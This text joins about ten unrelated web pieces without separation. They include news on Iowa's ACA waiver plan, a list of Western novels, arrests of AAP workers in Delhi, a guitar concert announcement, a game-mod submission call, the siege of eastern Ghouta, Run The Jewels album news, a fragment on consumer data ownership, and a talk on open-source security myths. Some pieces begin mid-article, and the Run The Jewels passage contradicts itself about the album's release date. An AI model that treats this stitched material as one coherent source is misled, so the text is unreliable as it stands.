In an extreme plan that Iowa's insurance commissioner submitted to federal health officials on Monday, the state would essentially take an estimated $350 million in federal ACA money that its residents and insurers would ordinarily receive next year and use it for different purposes.
The proposal would abolish Iowa's ACA insurance exchange and, unlike anywhere else in the country, give some people federal help in paying for coverage outside the marketplace. It would eliminate the law's subsidies for insurance premiums and out-of-pocket costs, instead creating a different type of tax credits resembling those favored by House Republicans. It would also replace tiers of coverage with a single level of insurance for customers buying health plans on their own.
In an important gesture to appease insurers — two of which intend to stop selling ACA plans in Iowa in 2018, with the remaining one threatening to do the same — the state also would create financial buffers to cover customers with particularly high medical expenses.
“Our market is collapsing, so the normal rules don't really fit the circumstance,” Doug Ommen, Iowa's insurance commissioner, said. He added that he met last Wednesday with Seema Verma, administrator of the Department of Health and Human Services' Centers for Medicare and Medicaid Services.
“We went through the plan, walked through it in some detail,” Ommen said, adding that he was “very optimistic that we will have a high level of cooperation” from CMS.
[White House touts the ACA's demise even as insurers seek help in stabilizing its marketplace]
The “stopgap” plan, as Iowa is portraying it, comes one week before the state's deadline for insurers to decide whether to participate in the marketplace next year. It is the most far-reaching deviation from the 2010 health-care law that any state has attempted — in both the changes it envisions and the fact that they would happen on such a rapid schedule, bypassing the normal steps the ACA permits for states seeking exceptions.
Some health policy experts on Monday questioned whether Iowa's plan would be legal. “Absolutely not,” said Tim Jost, an ACA supporter and retired professor of health-care law at Washington and Lee University, who said that federal officials may give permission for exceptions only under what are known as 1332 waivers. That process requires detailed data, public involvement and other lengthy steps that Iowa says are not practical.
A CMS spokeswoman said via email that the agency couldn't comment “on matters under review, and that is all we have to say.” A White House official, speaking on the condition of anonymity about a proposal on which the administration has not made a ruling, said officials “are going to work with states as best we can within the confines of the law to make sure states are doing what they can with the insurance marketplace.”
An administration decision to allow Iowa's plan would test how far any state could move from ACA rules without a change in federal law. The Trump administration has been crusading to repeal the ACA, and House Republicans narrowly passed a bill that would kill major features. Senate Republicans are trying to devise their own plan.
[Early proposed rates for ACA health plans hint at a jump in premiums for 2018]
“If the health debate in Congress stalls, then states may be lining up for waivers like this,” said Larry Levitt, senior vice president at the Kaiser Family Foundation.
At the moment, three states — Ohio, Missouri and Washington — have a total of nearly four dozen counties in which no insurer is willing to sell ACA plans for 2018.
Wellmark is one of the insurers that has announced its departure from Iowa; its chief executive, who attended the CMS meeting in Washington, has said the company will stay if that state's plan is approved. Wellmark sells many more individual policies outside the ACA marketplace than within the exchange, so the proposed rules would allow more of its customers to receive federal subsidies.
But Medica, a relatively small nonprofit insurer based in Minnesota that joined Iowa's ACA marketplace last year, is more wary of where the proposal will lead.
“What we want to have is rules,” said John Naylor, Medica's chief executive, who has laid out its terms for staying. “If the state of Iowa and the government can come up with some rules, we will assess that.”
This post is sponsored by El Paso by Winston Groom.
An episodic novel, El Paso pits the legendary Pancho Villa against a thrill-seeking railroad tycoon known as the Colonel, whose fading fortune is tied up in a colossal ranch in Chihuahua, Mexico. But when Villa kidnaps the Colonel's grandchildren and absconds into the Sierra Madre, the aging New England patriarch and his adopted son head to El Paso, hoping to find a group of cowboys braves enough to hunt the Generalissimo down. Replete with gunfights, daring escapes, and an unforgettable bullfight, El Paso is an indelible portrait of the American southwest in the waning days of the frontier.
I had no idea how much I loved reading Westerns until the spring of 2010. Up until then, I think I had read True Grit – a classic, of course – and maybe one other title that took place in the Wild West. Then one day I found myself stuck in bed with bronchitis and a copy of Lonesome Dove, and my life was changed. Cowboys! Gun fights! Cattle drives! I was swept away by the novel, all 800-plus pages of it, and immediately sought out more like it. Today I can easily say that, while I will read just about anything, Westerns are nearest and dearest to my heart. I have read A LOT of them in the last five years, and I think they're a wonderful genre for just about any reader. So here are ten great books about dust storms, horses, heroism, and bloodthirsty revenge that should make you kick up your spurs faster than you can say “Zane Grey.”
Vengeance Road by Erin Bowman
When Kate Thompson's father is killed by a notorious band of criminals, she doesn't turn the other cheek. Instead, she disguises herself as a boy and rides off in search of revenge. Along the way, she finds danger, disaster, and even love. This is a fun novel is the spirit of True Grit (and WOW that cover!)
Walk the Earth a Stranger by Rae Carson
Lee Westfall isn't your ordinary girl. She has a special ability – the ability to sense gold in the ground. Which comes in handy when you live in Gold Rush-era America. But it's an ability others would kill for, and when Lee is forced to flee her home, she pretends to be a man to make her journey safer and protect her from a man who wants her talents for himself. The first book in the Gold Seer trilogy, this is an unusual and exciting adventure.
The Sisters Brothers by Patrick deWitt
THIS BOOK IS SO FANTASTIC. Charlie and Eli Sisters are guns for hire sent out by the Commodore to kill Herman Kermit Warm. But the task proves a bit more daunting then they were expecting, and the brothers will have to deal with some strange encounters as the road to get their man takes them from Oregon to the Sierra foothills. If the Coen Brothers wrote a Western (instead of just directing one), I imagine it would be a lot like this.
Silver on the Road by Laura Anne Gilman
When Isobel turned sixteen, she got a job. It's working for The Devil, but hey, it's employment. Now working as his right-hand woman to oversee his employees in his southwest territories, Isobel must navigate the wild terrain and her dangerous boss. This book is SPECTACULAR, and the first of two. But don't fret – the second one is out in January 2017.
The Big Sky by A.B. Guthrie
The first of Guthrie's six novels set in the American frontier, it centers around Boone Caudill, a frontiersman whose travels across the country turn him into a wild outdoorsman. Published almost sixty years ago, it is credited for inspiring a surge of Westerns, both on the page and on the screen.
Warlock by Oakley Hall
Widely considered to be one of the best Westerns ever, Hall's 1957 classic is a fantastic tale of good versus evil. It is based on true stories of America's Wild West, and features a gun for hire given the position of sheriff (he's is really the only one willing to take the position) in the hopes he'll clean the town up and run the local criminal element out of town.
Under a Painted Sky by Stacey Lee
Samantha, a young Chinese girl on the run from the law, and Annamae, a runaway slave, head out together on the Oregon Trail. Disguised as Sammy and Andy, they pretend to be headed to California in search of gold, but the unknown frontier will bring many surprises and a lot of danger before they reach their destination. A wonderfully original take on young women living in the 1880s in America.
Blood Meridian: Or the Evening Redness in the West by Cormac McCarthy
If you like your books dark and disturbing, this is the book for you! It makes The Road look like a children's book. Utterly brilliant and relentlessly bleak, Blood Meridian is based on real events that took place at the Texas-Mexico border in the 1850s, and features The Judge, one of the most compelling, horrifying characters in all literature. You bet I love it.
Lonesome Dove by Larry McMurtry
This Pulitzer Prize-winning epic tale of Gus and Woodrow, two former Texas Rangers on a cattle drive, is AMAZING. It's full of adventure, danger, romance, friendship, wisdom, and lots of laughs. I was really surprised by how funny it is! I was so distraught when I finished it, so unwilling to let go of Gus and Woodrow so soon, that I slept with it under my pillow for a week. What? I'm not crying, you're crying.
True Grit by Charles Portis
Inspiration for thousands of “looking for the man who shot my Pa” stories, this may be the best Western ever written. (I also think Portis is America's greatest living writer, so I'm a bit biased.) Mattie Ross is only fourteen when her father is gunned down by Tom Cheney, the cowardly criminal. Using what she has been left, she pools her resources and hires Rooster Cogburn, a slovenly, disgraceful US Marshall to hunt Cheney down and bring him to justice. The only catch – she refuses to let Cogburn waltz off with all her money, so she must come along with him. This is storytelling at its best, and a great book for young adults as well as grown-ups.

Aam Aadmi Party's Delhi unit secretary and four party volunteers were arrested today for allegedly instigating thde people and putting up posters with proactive message against Congress MLAs in their area.
Deputy Commissioner of Police (South-East district) P Karunakaran said the arrested persons have been identified as Dilip Pandey, Ravi Shankar Singh, Sonu, Javed and Rajkumar. Pandey is the party's Delhi unit Secretary and a spokesman.
Reacting to the arrests, AAP chief Arvind Kejriwal alleged BJP was framing his party volunteers after the party "failed" in its bid to form the government. "Just because we foiled BJP's plans to form government in Delhi by buying MLAs, our volunteers and staff are being framed and arrested in false cases. It seems the lower police is being forced by seniors to arrest AAP leaders. So, who is masterminding it?" Kejriwal tweeted.
Just becoz we foiled BJP's plans to form govt in del by buying MLAs, our volunteers and staff are being framed and arrested in false cases — Arvind Kejriwal (@ArvindKejriwal) July 18, 2014
Gaurav n Abid were arrested and kept in police custidy for 2 days, badly beaten and forced to take names of senior party leaders. — Arvind Kejriwal (@ArvindKejriwal) July 18, 2014
A senior police officer, requesting anonymity, said Pandey was grilled at Jamia Nagar police station after AAP workers put up posters against Congress MLAs and some of the arrested workers of AAP had disclosed the name of Pandey.
A case under IPC, Prevention of Damage to Public Property Act and Press and Registration of Books Act, 1867, has been registered, the police said. The officer said the Congress MLAs alleged that the posters, along with proactive message, have been put up by AAP to divide the community. "Posters have been put up in the assembly constituencies of the three Muslim Congress MLAs, calling them 'traitors of the community', with rumours about a group of Congress MLAs being ready to support BJP government in Delhi gaining ground. The posters call for large-scale protests outside the residences of Mateen Ahmed, Asif Mohd Khan and Hasan Ahmed on July 16", the officer added.
Kejriwal claimed a man named Amanatullah had put up the posters and even confessed to it but the police have instead arrested AAP volunteers.
The Lehigh Valley High School for the Performing Arts and C. F. Martin & Co are proud to present “Guitarmania to Beatlemania: The Evolution of the Acoustic Guitar” featuring renowned Grammy Award-winning, guitar virtuoso Laurence Juber. The evening will showcase America's oldest and most revered maker of acoustic guitars and will feature a concert performance by guitarist Laurence Juber. Dick Boak, archivist for Martin Guitar, will present an interactive history of the 178-year-old guitar company, showcase an array of historically significant guitars that trace the instrument's evolution, and highlight the succession of famed guitarists that have contributed to American musical culture. In addition to his concert performance and period instrument demonstrations, Juber will discuss his work composing, recording, and performing as the lead guitarist with Paul McCartney's band Wings, as well as his prolific work as a solo instrumentalist.
Laurence Juber
Fusing folk, jazz,and pop styles, two-time Grammy-winner Laurence Juber creates a multifaceted performance that belies the use of only one acoustic guitar. The lead guitarist for Paul McCartney's Wings (with whom he earned a Grammy award), Juber is a world-renowned guitar virtuoso, composer and arranger.
He has released 20 solo albums of which the latest, Soul of Light, is a newly recorded retrospective collection of 30 years of his original compositions. Juber's solo arrangement of The Pink Panther earned him a second Grammy. His album Pop Goes Guitar includes his arrangement of Stand By Me that was heard nationally in a ‘Diamonds Are Forever' commercial. His LJ Plays The Beatles, was voted one of Acoustic Guitar Magazine's' all-time Top Ten albums.
As a studio musician, he can be heard on recent recordings from artists as diverse as Seal, Dan Hicks & the Hot Licks and Barry Manilow, plus he is featured on the soundtracks to hundreds of TV shows and movies including the academy award-winning Good Will Hunting and the current Muppet Movie. His playing can be heard on the score to ABC Family channel's hit show The Secret Life of the American Teenager.
As a composer, Juber has contributed the soundtrack of the new Activision/Blizzard Entertainment video game Diablo III. His music is also featured in the Ken Burns documentary The Tenth Inning and his original soundtrack to the NBC documentary Children of the Harvest.
With his wife Hope Juber, he has composed the scores to the musical comedies Gilligan's Island: The Musical, A Very Brady Musical and It's The Housewives!
“Juber is a master of acoustic finger style, but with less of the trick-guitar mishmash that seems obligatory among the high-octane pickers. He has a fluid style that shifts gears through simultaneous jazzy chording, leads, and bass lines, while weaving in and out of musical thoughts faster than a Formula One racer.” – San Diego Reader
“He gloriously articulates the melodies and never succumbs to show-off playing. But the notes spin out of the songs with such finesse and musical agility, it's hard to believe he has only 10 fingers and six strings. Juber has made a rare acoustic guitar record with bark and bite. His playing is just short of sleight of hand and, like all magicians, he makes it seem effortless.”
– San Francisco Chronicle
“Laurence Juber has redefined solo acoustic guitar playing”.- minor7th.com
Dick Boak
While Dick Boak's official title these days is Director of the Museum and Archives, and “Special Projects,” he has been inextricably intertwined with the world renowned Martin Guitar Company in Nazareth, PA for more than 35 years. He established and managed Martin's highly visible Artist Relations and Limited Edition guitar program which produced signature models for more than one hundred legendary artists including Eric Clapton, Paul Simon, Jimmy Buffett, Dave Matthews, Joan Baez, Johnny Cash, Willie Nelson, Tom Petty, John Mayer and Sting.
An employee since 1976, Dick has worn many hats at Martin. Originally hired as a design draftsman, he has been a builder of prototypes, manager of “The 1833 Shop,” founder of “A Woodworker's Dream” (which evolved into “Guitarmaker's Connection”), manager of Martin's Sawmill and Wood Products Division, and director of Martin's in house advertising department and print shop.
In addition to his varied responsibilities at Martin, he was instrumental in founding A.S.I.A. (The Association of Stringed Instrument Artisans). He edited and published A.S.I.A.'s “Guitarmaker Magazine” from 1989 to 1995 and organized A.S.I.A's many bi-annual Symposiums. More recently, he served on the Board of Director's of NAMM.
Dick is an accomplished and published illustrator, writer, designer, woodworker, guitarmaker, and occasional musician. He resides just north of Nazareth with his family.
I'm opening up the game to give followers a chance to see their personal levels and hear the tracks they produced in the game. Read the description for rules.

Why I'm Doing This
Recently, I've been bogged down by a lot of personal issues, and while I'm still working my absolute hardest on Midnight Animal, a lot of time and energy has been wasted alone on the struggle to constantly vacillate between the independently difficult tasks of maintaining the quality of my game and fending off personal crises. Right now, my main objectives are primarily to get the gameplay functioning to the best of its ability, and to finish up the script, and begin integrating it programming-wise. Consequently, this leaves me little time for some of the other aspects, particularly level design; and because of how little energy and effort I'm able to spend at the moment on level design, my creations have become redundant and the idiomatic writer's block has begun to really show off. So for both the sake of helping the mod progress as a whole, and for the perseverance of my sanity, I've decided to let fans submit their own content.
Guidelines
You can submit your levels to me either here in the comments, or in the relevant Reddit thread which I'll link later.
Levels should be created in the level editor. For most of you, this goes without saying, but for the one person who decides to create it in GameMaker, I appreciate the effort, but please don't.
DON'T POST LINKS TO THE LEVEL EDITOR FILES UNTIL YOU'VE BEEN PERSONALLY APPROVED! I don't mean to come off as scummy or as an asshole, but the last thing I need is a bunch of Dropbox links cluttering up the submissions feed.
I don't mean to come off as scummy or as an asshole, but the last thing I need is a bunch of Dropbox links cluttering up the submissions feed. Submit at least four screenshots through imgur (one of each floor in the overview, and at least two screens in-game) or screenshots of each floor along with a video. The floors go without saying, but for those who don't understand the in-game shots; they're to let me know how well the maps will look 'on the ground' and in action. A video is the most preferable means; but if you can't or don't want to, screenshots, will suffice.
A description of the level - what it is, the story behind it, why the player is there to begin with. Try to be unique, and as descriptive as possible. The more attention to detail, the better. Bonus points for the following kinds of levels: Art museum/gallery. Shipping yard/construction site. Any kind of minimalist corporate structure. Skyscraper penthouse.
For characters, it doesn't really matter who you choose; just make sure you don't limit it to one mask, and make sure the map is flexible in that it can be approached through a number of different playstyles.
Deadline
The deadline for this set for the end of this month (31 January 2016) but is pretty flexible, and if people continue to be interested, than I'll continue to accept submissions.
Some tips
More enemies =/= better or more difficult maps.
Keep in mind that the player character in Midnight Animal moves, attacks, and reacts much faster than pretty much every character in the Hotline Miami series.
Enemies are also a bit more responsive, and react faster.
For inspiration for the corporate levels, look to Mirror's Edge, Syndicate (2012), and Deus Ex: Human Revolution.
For the more urban environments, check out the example screenshots below:
Music submissions
If you're a musician interested in the Hotline Miami series or this mod and you'd like to submit some tracks, I'm opening up for submissions. If you can, please convert them to .ogg format first, so I can test them in-game without having to convert them myself. In particular, I'm looking for more calm and peaceful ambient tracks. For more action-paced tracks, I'm looking for dark, heavy tracks, along the lines of M|O|O|N's Paris, and artists like Carpenter Brut and Dance with the Dead.
The Assad regime continues to block the evacuation of the sick and wounded from the Damascus suburb of eastern Ghouta which has been under siege by regime forces since 2013. The International Committee of the Red Cross (ICRC) on Monday warned of a humanitarian crisis in the rebel-held area.
"The humanitarian situation in eastern Ghouta has reached a critical point. As so often in Syria over the last six years, ordinary people are once again trapped in a situation where life slowly becomes impossible and where goods and aid are severely limited," the ICRC's Middle East director, Robert Mardini, said in a statement.
"Some families can afford to eat only one meal a day, an especially sad situation for people with children. As a result, most people have been relying entirely on aid from humanitarian organizations," Mardini said.
Mardini went on: “In addition, medical workers on the ground report hundreds of sick and wounded people are deprived from life-saving medical care. The cold weather threatens to further deteriorate the situation. With almost no fuel available, people have very little access to proper heating, further risking their health.”
"Chronic disease sufferers and people with severe injuries are struggling to access care. The sick and injured must not be used as pawns in negotiations between the different parties involved in the fighting. Medical attention must be promptly given to those who need it irrespective of who they are," Mardini added.
Thirty-two cancer patients have died in eastern Ghouta in recent months due to lack of necessary medicines and the siege imposed by regime forces.
During the latest round of peace talks in Geneva, the Syrian opposition's Negotiations Committee called for an end to the bombardment on Easter Ghouta and the evacuation of the sick and wounded. In early December, the United Nations said that some 540 people, including 137 children, needed urgent medical evacuation.
In early May, regime forces prevented the delivery of medical supplies and fuel to eastern Ghouta and allowed only six trucks loaded with food and detergents into the besieged enclave. (Source: Syrian Coalition's Media Department + Agencies)
Credit where it's due: Pastor Doug Kriz of Grace Christian Church in McKinney, Texas wanted his congregation to get to know atheists in their community. Not to preach to them — not yet, anyway — but to understand why they might disagree with Christian beliefs and to break down the stereotypes.
To do that, he had a public conversation with two local atheists. No shouting. No preaching. Just a chance to hear Kyle and Janie Oyakawa‘s stories firsthand.
I would love to see other churches hold similar events. We know there are plenty of atheists who would love the opportunity to talk about why they are no longer religious — and who can do it in a way that won't alienate Christians in the crowd.
I haven't had a chance to listen to the entire conversation yet, but if any parts stand out to you, please leave a timestamp/summary in the comments!
Run The Jewels have delivered the first gift of the holidays.
Many fans awoke Christmas morning to discover the surprise release of Killer Mike and El-P's third collaborative album, which dropped at midnight East Coast time. The highly anticipated project wasn't expected until the announced release date of January 13, 2017.
The 14-song album is available for free download from their site (though the flood of traffic has overwhelmed the servers a few times), as well as on streaming platforms.

Run The Jewels fans can finally mark their calendars. El-P and Killer Mike's third collaborative album will arrive in January 13, 2017.
Among the 14 tracks listed for the RTJ3 album, guest spots come from Danny Brown, Trina, jazz saxophonist (and Kendrick Lamar collaborator) Kamasi Washington, TV On The Radio's Tunde Adebimpe and Dungeon Family associate Joi Gilliam.
To call the RTJ3 album “highly anticipated” would be putting it lightly.
welp yall crashed our site already haha. — el-p (@therealelp) December 1, 2016
Accompanying the previously released singles “Talk To Me” and “2100,” RTJ shared a brand-new track called “Legend Has It.”
They also shared a statement about the upcoming release on the group's website, along with pre-order options for free downloads, physical albums and merch.
Holy Shit. We can't believe we get to finally write this to you… RTJ3 IS READY!!!! After a straight year of work the next chapter in this madness is done. We'll spare you too much talk but we will say this: thank you so much for making RUN THE JEWELS the most amazing experience either of us have had in our careers.

14 Report to the Shareholders/Kill Your Masters
“The customer owns their data,” Ms. Winn says. “Whether they want to use our app or somebody else's, we want to make sure we are facilitating that.”
(Con Ed in New York also offers customers reduced pricing if they use electricity during off-peak hours. But the program requires the installation of a special meter.)
People might feel more comfortable about being subject to data-mining if companies did a better job of demonstrating a direct benefit to them, argues Jules Polonetsky, director of the Future of Privacy Forum, an industry financed research organization in Washington. One model for this, he says, is the product recommendation engine at Amazon, which lets customers view their purchase histories and excise one-off items they bought for friends that might not represent their own personal tastes.
“They are providing transparency as a feature,” Mr. Polonetsky says. “I can tweak their algorithm in a way that is mutually useful.” (Amazon is one of the sponsors of his organization.)
Even so, companies rarely offer customers more than a cropped snapshot of their activities.
Right now, for example, fitness enthusiasts who use blood pressure monitors, calorie calculators and movement sensors typically can't collate the data for a unified view of their wellness, Doc Searls, a technology writer who has experienced this kind of problem himself, told me. If people could easily integrate their data, he wrote in a recent blog post, they might be able to correlate weight loss to a particular workout routine or diet. Those companies that do allow customers to export their files and integrate their data elsewhere, he says, have a market advantage over companies that are data misers.
“Stock data, bank data, and bond data are all more valuable when they are looked at together,” says Mr. Searls, the author of “The Intention Economy: When Customers Take Charge.” “If I have a choice between apps and one of them shares the data that I can use more easily, I am going to choose that one.”
INTEL, for instance, recently introduced a “data economy” project, intended to encourage companies to think of consumers as participants in the information economy, and not just as data-harvesting opportunities. The venture includes a site called WeTheData.com, which looks at current obstacles to information sharing.
Detractors of open source software often point to its broad developer base and open source code as a potential security risk. But that's not a fair assessment, according to Dr Ian Levy, technical director with the CESG, a department of the UK's GCHQ intelligence agency that advises UK government on IT security.
Open source is no worse or better than proprietary software when it comes to security, according to Levy, who busted myths about open source security — and detailed its genuine security challenges — at the Open Source, Open Standards conference in London last week.
Myths
Open source software is more/less secure than proprietary
"I've done a lot of work on this, there's no objective evidence either way. On average, good open source is about as good as good proprietary, and [bad] about as bad proprietary," said Levy.
Asking whether any piece of software is secure is too broad a question, according to Levy. A more valuable approach, he added, is to ask what security guarantees your organisation wants from a piece of software and then ask whether the software delivers that.
Many eyes make for secure code
The idea that, because open source code is open for anyone to look at, its security will have been subjected to greater and more worthwhile scrutiny is questionable, said Levy.
Of everyone who had downloaded the Linux kernel code he asked: "'Who thinks they are competent to judge the security of the Linux kernel?' Downloading 21 million lines of Linux code and saying 'I've got the code and I've looked through it', so I can convince myself it's secure, is often nonsense.
"Many eyes give you many eyelashes, and not a lot else."
Bad people can look at the source code, so it's less secure
"Again that's nonsense. If I look at how people break software, they don't use the source code. If you look at all the bugs in closed source products, the people that find the bugs don't have the source, they have IDA Pro, it's out there and it's going to work on open and closed source binaries — get over it."
Anyone can contribute to the code so it's all bad
While some elements of this assertion might be true of some open source projects, "in a lot of open source projects it's not", he said. To offset this risk, learn about the open source project and its history and make a judgement call, he said.
Open source software means it's open for your organisation to use
Just because it's open source doesn't mean that it's free from restrictions. It could be in the licence — the GPL places restrictions on you, the BSD fewer restrictions. They may not be relevant to you at all, but there are restrictions."
Even if licensing isn't an issue, organisations can fall foul of separate IP rights conflicts, he said.
Levy gave the example of the distributed compute and storage software Hadoop , which is referred to as an open source project.
"It's a patented algorithm. Forget the implementation. The implementation may be IP-free but the algorithm is patented — do you think you can use it?"
All software must be evaluated for security
"That would be insane, and yet we still hear this. Around government every piece of software has to be evaluated before we buy — it's utter nonsense. Only security-enforcing functions need security evaluation."
Challenges
Software distribution
The online distribution methods used by many open source projects are vulnerable to genuine software binaries being replaced with fakes containing malicious code, he said.
"How do we get assurance for online distribution, because a SHA-1 hash and a PGP key sat on the same server as the distribution doesn't do it for me. There've been publicly noted attacks against distribution servers. Nobody's touched the source code, but they've touched the binary, the MD5, the SHA-1 and PGP code around it.
"You've downloaded it and checked the hash but you got the hash from the same place you got the binary. Where's my route of trust?"
Patching
The same question over provenance of the code can be raised when it comes to receiving patches for open source software, he said.
"If I go to Windows Update I know it's signed, and I have a process that works inside Microsoft. What do I know about Red Hat? A lot, and it's broadly equivalent.
"What do I know about 'Ian's Honest HTTP Server' software? You're going to have to do the work to assure yourself those patches sensibly controlled."
Exploit visibility
"Open source patches have to put out the source. They inherently disclose the underlying issue. So if I've got a security vulnerability in a product and I put a binary patch out, it's a chunk of work to reverse engineer it and work out what the underlying thing is. If it's open source, then I'm putting out a source patch and so I'm telling my attacker exactly what the problem is.
"That's not necessarily a bad thing, providing you've got a sensible patching regime. You've really got to have a sensible patching regime because time to exploit is probably going to lower."
Open source projects also have individuals and groups who actively track bugs in the code, which also makes these potentially unpatched bugs more visible.
"If they're open to everybody that's another issue, because now you get zero day exploits because there's no patch," he said.
Auditing the code supply chain
"How do I know who's written my code, how do I know what they've imported, how do I know what other stuff is in there?" said Levy.
When it comes to imported software modules, for example, an organisation can expect that a commercial company has a team of lawyers that check this imported code for licence compliance and engineers to handle reported bugs.
"How do I get the same kind of assurance with free software? What can I say about the legality of it? How do I know that somebody has looked at the licences of these imported modules and done the due diligence on it?
"I'm not saying you can't do it, I'm saying how do you do it? It's a different set of challenges."
Team breakdown
"Change of personality can have a much bigger effect in an open source product than it can in a commercial product. A commercial product has a brand value, an open source product is driven by a bunch of people. You'd hope they are all broadly aligned but there have been there's been spats in open source projects where they've massively changed direction."
Developer relations
Being able to evaluate the security of software relies heavily on having knowing the developers and having some insight into their future plans for the software, according to Levy.
"The security evaluation is about the developer relationship, it's not about source code," he said.
"Anybody who thinks an evaluation crawls through every line of source code looking for vulnerabilities is sorely mistaken — it's about big picture stuff. The evaluation at the level we're talking about is does the developer have clue what they're doing? Do they have a long term plan for keeping this thing secure? Do they have an incident management plan?
"Extracting product design architecture from code is incredibly difficult. If you haven't got a relationship with the developer to ask 'Why did you design it like this?' then evaluation is really difficult and often you need a third party to act in this role. It's a business risk to be managed."
Developer identities are generally weak
Whereas a commercial company may have several layers of assurance for developer identity — an on-boarding process, an identity process, a technical identity process for checking-in source code — establishing developer identity can be far trickier for some open source projects.
"For some of these projects it's a Gmail address. Who wants to bet the farm on the security of someone's Gmail account? There ways around all of these but these are things you have to think about."
Lack of development standard and common security infrastructure
"I can audit a company and say 'You have these standards and apply them and yes you have incidents but you manage them well'. How do I do that for a diverse set of developers on their own hardware?"
